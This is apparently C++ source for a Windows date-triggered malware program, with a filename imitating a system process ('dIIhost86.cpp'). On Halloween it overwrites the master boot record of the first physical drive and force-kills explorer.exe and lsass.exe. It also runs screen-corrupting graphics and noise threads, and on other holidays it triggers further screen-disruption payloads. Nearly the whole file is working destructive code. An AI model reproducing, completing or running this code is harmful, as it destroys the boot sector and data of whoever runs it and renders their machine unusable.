// dIIhost86.cpp : hqfhskdorsdwkb.exe's main function
//

#include <Windows.h>
#include <time.h>
#include <sstream>
#include <ostream>
#include <iostream>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#define M_PI   3.14159265358979323846264338327950288
const unsigned char MasterBootRecord[] = { 0xE8, 0x03, 0x00, 0xE8, 0x1D, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xFF,
0x06, 0x5D, 0x7C, 0xEB, 0x12, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x2D, 0x81, 0xFA, 0xC8, 0x00, 0x73,
0xEA, 0xCD, 0x10, 0x41, 0xEB, 0xED, 0xC3, 0x89, 0xCB, 0x21, 0xD3, 0x88, 0xD8, 0x22, 0x06, 0x5D,
0x7C, 0xC0, 0xE8, 0x02, 0xEB, 0x00, 0x3C, 0x37, 0x77, 0x06, 0x3C, 0x20, 0x72, 0x06, 0xEB, 0xD5,
0x2C, 0x10, 0xEB, 0xF2, 0x04, 0x20, 0xEB, 0xEE, 0x31, 0xC9, 0x42, 0xEB, 0xC6, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
}; //credits to JhoPro/ArTicZera for the original code
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI melt(LPVOID lpParam) { //April Fools payload - Screen Melting with inversion
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		int rrr = rand() % sw;
		BitBlt(hdc, rrr, rand() % 8 - 4, rand() % 100, sh, hdc, rrr, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI redbrush(LPVOID lpParam) { //Christmas payload I guess
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, 0, 0));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(rand()%1000);
	}
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		text1 = "FALLING APART!!!";
		text2 = "DEATH!!!";
		text3 = "EATEN ALIVE!!!";
		text4 = "SWALLOWED WHOLE!!!";
		text5 = "NO WAY OUT!!!";
		SetBkColor(hdc, RGB(0, rand()% 25, rand() % 255));
		SetTextColor(hdc, RGB(0, 0, rand()%255));
		HFONT font = CreateFontA(43, 32, rand() % 360, rand() % 360, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Webdings");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(rand()%10);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI bounce(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = sw;
	bmpi.bmiHeader.biHeight = sh;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	int rx;
	double moveangle = 0;
	while (true) {
		hdc = GetDC(0);
		rx = rand() % sw;
		int ry = rand() % sh;
		int ax = (int)(sin(moveangle) * 10.0);
		int ay = (int)(sin(moveangle) * 10.0);
		BitBlt(dcCopy, ax, ay, sw, sh, hdc, 0, 0, 0x999999);
		AlphaBlend(hdc, 0, 0, sw, sh, dcCopy, 0, 0, sw, sh, blur);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI plgblt(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 50;
		wPt[0].y = wRect.top - 50;
		wPt[1].x = wRect.right + 50;
		wPt[1].y = wRect.top + 50;
		wPt[2].x = wRect.left - 50;
		wPt[2].y = wRect.bottom - 50;
		PlgBlt(hdc, wPt, hdc, wRect.left-20, wRect.top-20, (wRect.right - wRect.left)+40, (wRect.bottom - wRect.top)+40, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> (rand() % 69)) + t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
INT CheckDate(INT i) //credits to ArTicZera for the date checking function, but I fixed sh!tty conflicts in the code
{
	time_t t = time(0);
	tm date = *localtime(&t);

	if (i == 32) i = date.tm_mday; //1-31
	if (i == 33) i = date.tm_mon;  //0-11
	if (i == 34) i = date.tm_year; //XXXX

	//Actually the return value for the year is
	//The year of the system - 1900. 
	//And the return value of the month is The month of the system -1

	return i;
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
) 
{
	//time_t t = time(0);
	//std::cout << CheckDate(32)<<std::endl;
	//std::cout << localtime(&t); //debug code to diagnose the bug that was caused by i value conflict
	while (1) { //we will check the dates every minute
		if (CheckDate(32) == 1 && CheckDate(33) == 0) //this painful code took me hours to make
		{
			time_t t = time(0);
			tm date = *localtime(&t);
			int yr = date.tm_year + 1900;
			std::ostringstream ostrm;
			ostrm << "Happy new year " << yr << std::endl;
			MessageBox(NULL, ostrm.str().c_str(), "Happy New Year from hqfhskdorsdwkb.exe!", MB_ICONINFORMATION);
			Sleep(-1);
		}
		else if (CheckDate(32) == 1 && CheckDate(33) == 3)
		{
			HANDLE thread1 = CreateThread(0, 0, melt, 0, 0, 0);
			Sleep(-1);
		}
		else if (CheckDate(32) == 31 && CheckDate(33) == 9) //check if it's October 31, and run the final collapse of the system
		{
			Sleep(5000);
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			PlaySoundW(L"C:\\windows\\death.wav", NULL, SND_LOOP | SND_ASYNC);
			ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, SW_SHOWDEFAULT);
			ShellExecuteA(NULL, NULL, "taskkill", "/f /im lsass.exe", NULL, SW_SHOWDEFAULT); //the best way to kill process by name in visual c++, because sh!tty microsoft compiler doesn't like every other way to do this task and GCC is meh
			HANDLE thread3 = CreateThread(0, 0, textout1, 0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, bounce, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			sound1();
			HANDLE thread5 = CreateThread(0, 0, plgblt, 0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, redbrush, 0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, melt, 0, 0, 0);
			Sleep(-1);
		}
		else if (CheckDate(32) == 25 && CheckDate(33) == 11) //check if it's Christmas, if your PC somehow managed to survive the Halloween payload
		{
			ShellExecuteA(NULL, NULL, "C:\\Windows\\Christmas.exe", NULL, NULL, SW_SHOWDEFAULT);
			HANDLE thread2 = CreateThread(0, 0, redbrush, 0, 0, 0);
			PlaySoundW(L"C:\\windows\\xmas.wav", NULL, SND_LOOP | SND_ASYNC);
			MessageBox(NULL, "Merry Christmas from hqfhskdorsdwkb.exe!", "hqfhskdorsdwkb.exe - Merry Christmas", MB_ICONINFORMATION);
			Sleep(-1);
		}
		Sleep(60000);
	}
}

